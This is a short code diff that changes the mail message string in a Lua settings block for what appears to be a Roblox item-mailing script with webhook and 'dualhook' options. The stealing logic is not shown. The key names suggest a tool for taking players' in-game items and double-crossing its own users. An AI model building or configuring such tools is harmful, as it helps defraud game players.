@@ -9,7 +9,7 @@
 getgenv().Settings = {
     User = "EZP0D",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "Skeptical Scripts On Top",
+    MailMessage = "rizzify",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
